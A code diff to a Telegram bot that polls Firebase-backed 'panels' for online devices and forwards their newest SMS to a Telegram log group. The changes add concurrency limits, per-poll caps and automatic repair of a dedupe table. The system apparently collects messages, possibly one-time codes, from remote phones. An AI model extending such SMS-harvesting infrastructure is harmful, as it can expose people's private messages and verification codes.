@@ -7,7 +7,11 @@ import { logger } from "./logger";
 const SMS_LOG_GROUP_ID = process.env.SMS_LOG_GROUP_ID || "-1002847599431";
 const SMS_LOG_GET_NUMBER_URL = process.env.SMS_LOG_GET_NUMBER_URL || "https://t.me/Annebellasmsbot?start=promo";
 const WATCH_INTERVAL_MS = 15000;
+const PANEL_CONCURRENCY = positiveIntegerEnv("SMS_LOG_PANEL_CONCURRENCY", 3);
+const DEVICE_CONCURRENCY = positiveIntegerEnv("SMS_LOG_DEVICE_CONCURRENCY", 8);
 const SEND_CONCURRENCY = 4;
+const MAX_MESSAGES_PER_DEVICE = 4;
+const MAX_PENDING_PER_POLL = 80;
 const inFlightSms = new Set<string>();
 let interval: NodeJS.Timeout | null = null;
 let running = false;
@@ -50,6 +54,11 @@ const E_FB: Record<string, string> = {
   "5436128410609417960": "🔔",
   "6026056450223116307": "🖥️",
 };
+
+function positiveIntegerEnv(name: string, fallback: number): number {
+  const value = Number(process.env[name] || fallback);
+  return Number.isFinite(value) && value > 0 ? Math.floor(value) : fallback;
+}
 
 function em(id: string): string {
   return `<tg-emoji emoji-id="${id}">${E_FB[id] ?? "•"}</tg-emoji>`;
@@ -100,6 +109,28 @@ function escapeHtml(value: string): string {
     };
     return entities[character] ?? character;
   });
+}
+
+async function mapWithConcurrency<T, R>(
+  items: T[],
+  concurrency: number,
+  mapper: (item: T) => Promise<R>,
+): Promise<R[]> {
+  const results: R[] = [];
+  let cursor = 0;
+  const workers = Array.from({ length: Math.min(concurrency, items.length) }, async () => {
+    while (cursor < items.length) {
+      const index = cursor++;
+      results[index] = await mapper(items[index]);
+    }
+  });
+  await Promise.all(workers);
+  return results;
+}
+
+function isKnownSmsLogStorageError(err: unknown): boolean {
+  const message = err instanceof Error ? err.message : String(err);
+  return message.includes("invalid input syntax for type interval") || message.includes("sms_log_entries");
 }
 
 function smsLogKeyboard() {
@@ -188,6 +219,33 @@ function smsKey(panelId: number, deviceId: string, message: FirebaseSmsMessage):
 async function ensureSmsLogStorage(): Promise<void> {
   if (storageReady) return;
   await pool.query(`
+    DO $$
+    DECLARE
+      bad_columns integer;
+    BEGIN
+      IF to_regclass('sms_log_entries') IS NOT NULL THEN
+        SELECT COUNT(*) INTO bad_columns
+        FROM information_schema.columns
+        WHERE table_schema = current_schema()
+          AND table_name = 'sms_log_entries'
+          AND (
+            (column_name = 'sms_key' AND data_type <> 'text') OR
+            (column_name = 'panel_id' AND data_type <> 'integer') OR
+            (column_name = 'device_id' AND data_type <> 'text') OR
+            (column_name = 'sender' AND data_type <> 'text') OR
+            (column_name = 'message_text' AND data_type <> 'text') OR
+            (column_name = 'message_time' AND data_type <> 'text') OR
+            (column_name = 'sent_at' AND data_type <> 'timestamp with time zone') OR
+            (column_name = 'attempts' AND data_type <> 'integer')
+          );
+
+        IF bad_columns > 0 THEN
+          DROP TABLE sms_log_entries;
+        END IF;
+      END IF;
+    END $$;
+  `);
+  await pool.query(`
     CREATE TABLE IF NOT EXISTS sms_log_entries (
       id serial PRIMARY KEY,
       sms_key text NOT NULL UNIQUE,
@@ -206,22 +264,35 @@ async function ensureSmsLogStorage(): Promise<void> {
   storageReady = true;
 }
 
+async function resetSmsLogStorageAfterSchemaError(): Promise<void> {
+  storageReady = false;
+  inFlightSms.clear();
+  await pool.query("DROP TABLE IF EXISTS sms_log_entries");
+  await ensureSmsLogStorage();
+}
+
 async function rememberExistingSms(key: string, panelId: number, deviceId: string, message: FirebaseSmsMessage): Promise<void> {
   await ensureSmsLogStorage();
 
-  await db
-    .insert(smsLogEntriesTable)
-    .values({
-      smsKey: key,
-      panelId,
-      deviceId,
-      sender: message.sender || null,
-      messageText: message.text,
-      messageTime: message.time || null,
-      sentAt: new Date(),
-      attempts: 0,
-    })
-    .onConflictDoNothing({ target: smsLogEntriesTable.smsKey });
+  try {
+    await db
+      .insert(smsLogEntriesTable)
+      .values({
+        smsKey: key,
+        panelId,
+        deviceId,
+        sender: message.sender || null,
+        messageText: message.text,
+        messageTime: message.time || null,
+        sentAt: new Date(),
+        attempts: 0,
+      })
+      .onConflictDoNothing({ target: smsLogEntriesTable.smsKey });
+  } catch (err) {
+    if (!isKnownSmsLogStorageError(err)) throw err;
+    logger.warn({ err }, "Repairing SMS log dedupe table after schema mismatch");
+    await resetSmsLogStorageAfterSchemaError();
+  }
 }
 
 async function reserveSmsForLogging(key: string, panelId: number, deviceId: string, message: FirebaseSmsMessage): Promise<boolean> {
@@ -229,17 +300,26 @@ async function reserveSmsForLogging(key: string, panelId: number, deviceId: stri
   inFlightSms.add(key);
   await ensureSmsLogStorage();
 
-  const result = await pool.query(
-    `
-      INSERT INTO sms_log_entries (sms_key, panel_id, device_id, sender, message_text, message_time, attempts)
-      VALUES ($1, $2, $3, $4, $5, $6, 1)
-      ON CONFLICT (sms_key) DO UPDATE
-        SET attempts = sms_log_entries.attempts + 1
-        WHERE sms_log_entries.sent_at IS NULL
-      RETURNING id
-    `,
-    [key, panelId, deviceId, message.sender || null, message.text, message.time || null]
-  );
+  let result;
+  try {
+    result = await pool.query(
+      `
+        INSERT INTO sms_log_entries (sms_key, panel_id, device_id, sender, message_text, message_time, attempts)
+        VALUES ($1, $2, $3, $4, $5, $6, 1)
+        ON CONFLICT (sms_key) DO UPDATE
+          SET attempts = sms_log_entries.attempts + 1
+          WHERE sms_log_entries.sent_at IS NULL
+        RETURNING id
+      `,
+      [key, panelId, deviceId, message.sender || null, message.text, message.time || null]
+    );
+  } catch (err) {
+    inFlightSms.delete(key);
+    if (!isKnownSmsLogStorageError(err)) throw err;
+    logger.warn({ err }, "Repairing SMS log dedupe table after reserve failure");
+    await resetSmsLogStorageAfterSchemaError();
+    return false;
+  }
 
   if (result.rowCount === 0) {
     inFlightSms.delete(key);
@@ -298,10 +378,12 @@ async function collectPanelSmsLogs(panel: Panel): Promise<PendingSmsLog[]> {
   const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
   const onlineDevices = devices.filter((device) => device.status);
 
-  const perDevice = await Promise.all(
-    onlineDevices.map(async (device) => {
+  const perDevice = await mapWithConcurrency(
+    onlineDevices,
+    DEVICE_CONCURRENCY,
+    async (device) => {
       const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
-      const newest = messages.slice(0, 8);
+      const newest = messages.slice(0, MAX_MESSAGES_PER_DEVICE);
       const pending: PendingSmsLog[] = [];
 
       for (const message of newest.reverse()) {
@@ -317,7 +399,7 @@ async function collectPanelSmsLogs(panel: Panel): Promise<PendingSmsLog[]> {
       }
 
       return pending;
-    })
+    },
   );
 
   return perDevice.flat();
@@ -354,7 +436,9 @@ async function pollSmsLogs(): Promise<void> {
   try {
     await ensureSmsLogStorage();
     const panels = await db.select().from(panelsTable);
-    const pending = (await Promise.all(panels.map((panel) => collectPanelSmsLogs(panel)))).flat();
+    const pending = (await mapWithConcurrency(panels, PANEL_CONCURRENCY, (panel) => collectPanelSmsLogs(panel)))
+      .flat()
+      .slice(0, MAX_PENDING_PER_POLL);
     pending.sort((a, b) => (a.message.timestampMs ?? 0) - (b.message.timestampMs ?? 0));
     await sendPendingSmsLogs(pending);
     void trimSmsLogStorage().catch((err) => logger.warn({ err }, "Failed to trim SMS log dedupe table"));
